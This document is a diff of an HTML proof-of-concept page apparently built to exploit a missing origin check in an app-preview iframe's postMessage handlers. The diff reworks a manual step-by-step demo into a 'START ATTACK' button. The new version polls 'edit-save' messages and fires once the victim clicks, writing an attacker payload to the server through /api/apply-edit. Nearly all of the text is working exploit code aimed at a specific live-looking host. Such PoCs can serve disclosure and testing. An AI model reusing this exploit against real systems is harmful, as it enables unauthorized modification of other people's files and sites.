@@ -6,44 +6,37 @@
     * { box-sizing: border-box; }
     body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; margin: 0; }
     h2 { color: #fff; margin-bottom: 4px; }
-    .meta { color: #888; font-size: 13px; margin-bottom: 16px; }
+    .meta { color: #888; font-size: 13px; margin-bottom: 14px; }
     .meta strong { color: #ff0; }
 
     #status {
-      background: #111;
-      border: 2px solid #555;
-      border-radius: 6px;
-      padding: 12px 16px;
-      margin-bottom: 10px;
-      font-size: 15px;
-      min-height: 48px;
+      border: 2px solid #555; border-radius: 6px;
+      padding: 12px 16px; margin-bottom: 10px;
+      font-size: 15px; min-height: 50px; background: #111;
     }
     #status.waiting { border-color: #555; color: #888; }
     #status.ready   { border-color: #ff0; color: #ff0; }
     #status.success { border-color: #0f0; color: #0f0; }
-    #status.error   { border-color: #f00; color: #f00; }
+    #status.error   { border-color: #f44; color: #f44; }
 
-    .buttons { margin-bottom: 10px; display: flex; gap: 8px; flex-wrap: wrap; }
+    .btns { margin-bottom: 10px; display: flex; gap: 8px; }
     button {
       background: #0f0; color: #000; border: none;
       padding: 9px 18px; cursor: pointer; font-weight: bold;
       font-family: monospace; font-size: 13px; border-radius: 3px;
     }
-    button:disabled { background: #333; color: #666; cursor: not-allowed; }
-    button.red  { background: #f44; }
-    button.blue { background: #0af; }
-    button.grey { background: #555; color: #fff; }
+    button.grey { background: #444; color: #ccc; }
 
     #log {
       background: #000; border: 1px solid #333; border-radius: 4px;
-      padding: 10px; height: 130px; overflow-y: auto;
+      padding: 10px; height: 120px; overflow-y: auto;
       font-size: 12px; margin-bottom: 10px;
     }
-    .s { color: #f90; }   /* sent */
-    .r { color: #0af; }   /* received */
-    .ok { color: #0f0; font-weight: bold; } /* success */
-    .er { color: #f44; }  /* error */
-    .i  { color: #666; }  /* info */
+    .s  { color: #f90; }
+    .r  { color: #0af; }
+    .ok { color: #0f0; font-weight: bold; }
+    .er { color: #f44; }
+    .i  { color: #666; }
 
     iframe {
       width: 100%; height: 460px;
@@ -64,15 +57,16 @@
 
 <div id="status" class="waiting">Waiting for iframe to load…</div>
 
-<div class="buttons">
-  <button onclick="step1()" id="btn1">① Enable edit mode</button>
-  <button onclick="step3()" id="btn3" class="red">③ Fire edit-save (after clicking in iframe)</button>
-  <button onclick="resetAll()" class="grey">↺ Reset (reload iframe)</button>
+<div class="btns">
+  <button onclick="startAttack()">▶ START ATTACK</button>
+  <button onclick="resetAll()" class="grey">↺ Reset</button>
 </div>
 
 <div id="log"></div>
 
-<iframe id="target" src="https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com/"></iframe>
+<iframe id="target"
+  src="https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com/">
+</iframe>
 
 <script>
   const PAYLOAD = 'PWNED BY ATTACKER — postMessage no origin check';
@@ -80,9 +74,14 @@
 
   document.getElementById('my-origin').textContent = window.location.origin;
 
-  const iframe  = document.getElementById('target');
-  const logEl   = document.getElementById('log');
+  const iframe   = document.getElementById('target');
+  const logEl    = document.getElementById('log');
   const statusEl = document.getElementById('status');
+
+  let pollTimer   = null;
+  let attackDone  = false;
+
+  // ── helpers ────────────────────────────────────────────────────────────────
 
   function log(msg, cls = 'i') {
     const ts = new Date().toISOString().split('T')[1].slice(0, 12);
@@ -98,71 +97,90 @@
   function send(type, payload) {
     const msg = payload !== undefined ? { type, payload } : { type };
     iframe.contentWindow.postMessage(msg, '*');
-    log(`→ SENT  type="${type}"  payload=${JSON.stringify(payload ?? null)}`, 's');
   }
 
-  // ── Step 1: enable edit mode ──────────────────────────────────────────────
-  function step1() {
-    send('enable-edit-mode');
+  // ── main attack ────────────────────────────────────────────────────────────
+
+  function startAttack() {
+    attackDone = false;
+    clearInterval(pollTimer);
     iframe.classList.add('armed');
-    setStatus('② Edit mode enabled. Now click any text in the preview iframe below, then click ③.', 'ready');
-    log('Edit mode sent. Click "Hello" (or any text) inside the iframe now.', 'i');
+
+    log('Sending enable-edit-mode from ' + window.location.origin, 's');
+    send('enable-edit-mode');
+
+    setStatus('② Edit mode active. Click any text inside the preview below. Attack fires automatically.', 'ready');
+    log('Edit mode sent. Now click "Hello" (or any text) inside the iframe.', 'i');
+    log('Polling edit-save every 1s — fires the moment you click an element.', 'i');
+
+    // Poll edit-save every second.
+    // When currentEditingInfo is null → silent TypeError inside iframe, no POST.
+    // When user clicks any data-edit-id element → currentEditingInfo set → next poll hits.
+    pollTimer = setInterval(() => {
+      if (attackDone) { clearInterval(pollTimer); return; }
+      send('edit-save', { newText: PAYLOAD });
+      log('→ POLL  edit-save sent (waiting for element click to set currentEditingInfo)', 's');
+    }, 1000);
   }
 
-  // ── Step 3: fire edit-save ────────────────────────────────────────────────
-  function step3() {
-    send('edit-save', { newText: PAYLOAD });
-    setStatus('edit-save sent — check DevTools → Network for POST /api/apply-edit', 'ready');
-    log('edit-save fired. Open DevTools → Network → find apply-edit → verify 200 OK.', 'ok');
-  }
+  // ── listen for messages from app-preview ──────────────────────────────────
 
-  // ── Reset: reload iframe, restart cleanly ─────────────────────────────────
-  function resetAll() {
-    log('--- Resetting: reloading iframe ---', 'i');
-    iframe.classList.remove('armed', 'done');
-    setStatus('Reloading iframe…', 'waiting');
-    iframe.src = TARGET + '?t=' + Date.now(); // cache-bust
-  }
-
-  // ── Auto step-1 on load ───────────────────────────────────────────────────
-  iframe.addEventListener('load', () => {
-    log('iframe loaded ✓ — origin: ' + window.location.origin, 'i');
-    setStatus('Iframe loaded. Click ① to enable edit mode.', 'ready');
-
-    // If you want fully automatic step1, uncomment:
-    // setTimeout(step1, 1000);
-  });
-
-  // ── Listen for any messages coming back from app-preview ──────────────────
   window.addEventListener('message', (event) => {
     if (!event.origin.includes('app-preview') && !event.origin.includes('horizons')) return;
 
     const type = event.data?.type || event.data?.message;
-    log(`← RECV  origin="${event.origin}"  type="${type}"`, 'r');
 
+    // editEnter: user clicked an editable element → currentEditingInfo is now set
     if (type === 'editEnter') {
-      const txt = event.data?.payload?.currentText;
-      log(`editEnter — element clicked, currentText="${txt}". currentEditingInfo is now set inside iframe.`, 'ok');
-      setStatus(`Element clicked ("${txt}"). Click ③ now to fire edit-save.`, 'ready');
+      const txt = event.data?.payload?.currentText || '?';
+      log(`← editEnter received — element clicked, currentText="${txt}". Next poll fires the attack.`, 'r');
+      setStatus(`Element clicked ("${txt}"). Firing edit-save now…`, 'ready');
+
+      // Fire immediately, don't wait for next poll interval
+      clearInterval(pollTimer);
+      setTimeout(() => send('edit-save', { newText: PAYLOAD }), 100);
+      log('→ IMMEDIATE  edit-save fired', 'ok');
     }
 
+    // editApplied: server confirmed the write (if parent origin check passes)
     if (type === 'editApplied') {
-      log('editApplied received — server confirmed the write!', 'ok');
-      setStatus('SUCCESS — /api/apply-edit returned 200. Content overwritten.', 'success');
+      attackDone = true;
+      clearInterval(pollTimer);
       iframe.classList.remove('armed');
       iframe.classList.add('done');
+      const editId = event.data?.payload?.editId;
+      log(`← editApplied — editId="${editId}" — SERVER CONFIRMED WRITE`, 'ok');
+      setStatus('SUCCESS — /api/apply-edit returned 200. File overwritten on server.', 'success');
     }
 
-    if (type === 'route-changed') {
-      // HMR reloaded the page inside iframe after edit — state is reset
-      log('route-changed: iframe reloaded (HMR). currentEditingInfo is now NULL. Click ↺ Reset then redo ①②③.', 'er');
-      setStatus('Iframe reloaded after edit (HMR). Click ↺ Reset to start fresh.', 'error');
+    // route-changed: HMR reloaded iframe after edit — state reset
+    if (type === 'route-changed' && !attackDone) {
+      clearInterval(pollTimer);
+      log('← route-changed: HMR reloaded iframe. State reset. Click ↺ Reset to retry.', 'er');
+      setStatus('Iframe reloaded (HMR fired after edit). Click ↺ Reset then ▶ Start again.', 'error');
       iframe.classList.remove('armed', 'done');
     }
   });
 
-  log('PoC ready. Attacker origin: ' + window.location.origin, 'i');
-  log('NOT in ALLOWED_PARENT_ORIGINS — all edit handlers accept messages anyway.', 'i');
+  // ── reset ─────────────────────────────────────────────────────────────────
+
+  function resetAll() {
+    attackDone = false;
+    clearInterval(pollTimer);
+    iframe.classList.remove('armed', 'done');
+    setStatus('Reloading iframe…', 'waiting');
+    log('--- Reset: reloading iframe ---', 'i');
+    iframe.src = TARGET + '?t=' + Date.now();
+  }
+
+  // ── on iframe load ─────────────────────────────────────────────────────────
+
+  iframe.addEventListener('load', () => {
+    log('iframe loaded ✓  attacker origin: ' + window.location.origin, 'i');
+    setStatus('Iframe loaded. Click ▶ START ATTACK.', 'ready');
+  });
+
+  log('PoC loaded. Origin: ' + window.location.origin + ' (NOT in ALLOWED_PARENT_ORIGINS)', 'i');
 </script>
 </body>
 </html>
